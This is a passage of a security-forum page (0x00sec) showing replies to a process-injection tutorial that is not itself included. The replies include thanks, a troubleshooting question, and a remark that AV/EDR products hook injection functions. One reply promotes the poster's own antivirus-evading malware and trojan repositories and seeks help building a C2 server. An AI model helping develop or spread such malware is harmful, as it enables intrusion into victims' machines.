<meta itemprop="dateModified" content="2020-12-29T18:42:13Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thanks pry,<br>
your kind words encourage me to do more of these.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Alekhine"><span itemprop="name">Alekhine</span></a>
</span>
<link itemprop="mainEntityOfPage" href="24399.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2020-12-29T20:42:01Z" class="post-time">
December 29, 2020, 8:42pm
</time>
<meta itemprop="dateModified" content="2020-12-29T20:42:01Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Really great stuff man. This kind of knowledge is hard to find. Keep writing, we appreciate it!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/alion"><span itemprop="name">alion</span></a>
(ali)
</span>
<link itemprop="mainEntityOfPage" href="24399.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2020-12-30T21:45:34Z" class="post-time">
December 30, 2020, 9:45pm
</time>
<meta itemprop="dateModified" content="2020-12-30T21:45:34Z">
<span itemprop="position">5</span>
</span>
</div>
<div class="post" itemprop="text">
<p>thanks man. that really motivates me to keep on writing.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/slowpokeeh"><span itemprop="name">slowpokeeh</span></a>
(slowpokeeh)
</span>
<link itemprop="mainEntityOfPage" href="24399.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2021-01-07T21:41:08Z" class="post-time">
January 7, 2021, 9:41pm
</time>
<meta itemprop="dateModified" content="2021-01-07T21:41:08Z">
<span itemprop="position">6</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Great Tutorial!<br>
Ive been trying to mess a bit with process injection, but unfortunately my calc.exe process gets spawned and instantly suspended. Im probably missing something.</p>
<p>I hope to read more good articles like that from you in the future!<br>
Very good work.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_7" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/alexa"><span itemprop="name">alexa</span></a>
(mohammad ali)
</span>
<link itemprop="mainEntityOfPage" href="24399.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2021-01-14T04:53:54Z" class="post-time">
January 14, 2021, 4:53am
</time>
<meta itemprop="dateModified" content="2021-01-14T04:53:54Z">
<span itemprop="position">7</span>
</span>
</div>
<div class="post" itemprop="text">
<p>nice tutorial, although i think using these functions will make your malware suspicious so that it will get blocked , i didnt try it but i read a lot of articles, some anti viruses will try to hook these functions if they thought it is suspicious, anyway thank you for this tutorial, i build an malware that can bypass windows defender, and execute meterpreter shellcode, the problem is i need someone else to build the c2 server with, if anyone have some time please take a look at my post in github : <a href="https://github.com/alexa872/EVA---FUD" rel="noopener nofollow ugc">https://github.com/alexa872/EVA---FUD</a><br>
and i got another one that uses a loader to load a dll can also bypass windows 10<br>
:: <a href="https://github.com/alexa872/Peony----TROJAN" rel="noopener nofollow ugc">https://github.com/alexa872/Peony----TROJAN</a></p>
<p>im looking to add some go code to my malware, as well as to build the c2 server with it, or with python … thank you and have a nice day</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_8" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/alion"><span itemprop="name">alion</span></a>
(ali)
</span>
<link itemprop="mainEntityOfPage" href="24399.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2021-01-16T17:23:52Z" class="post-time">
January 16, 2021, 5:23pm
</time>
<meta itemprop="dateModified" content="2021-01-16T17:23:52Z">
<span itemprop="position">8</span>
</span>
</div>
<div class="post" itemprop="text">
<p>every AV/EDR has its own set of functions to hook. also, remote thread injection has some limitations as it is one of the basic and well known techniques of process injection. but it could still be useful <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_9" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/qyq"><span itemprop="name">qyq</span></a>
</span>
<link itemprop="mainEntityOfPage" href="24399.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2021-01-30T18:17:36Z" class="post-time">
January 30, 2021, 6:17pm
</time>
<meta itemprop="dateModified" content="2021-01-30T18:17:36Z">
<span itemprop="position">9</span>
</span>
</div>
<div class="post" itemprop="text">
<p>thank what a nice job</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_10" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/system"><span itemprop="name">system</span></a>
(system)
Closed
</span>
<link itemprop="mainEntityOfPage" href="24399.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2021-04-29T11:44:06Z" class="post-time">
April 29, 2021, 11:44am
</time>
<meta itemprop="dateModified" content="2021-04-29T11:44:06Z">
<span itemprop="position">10</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
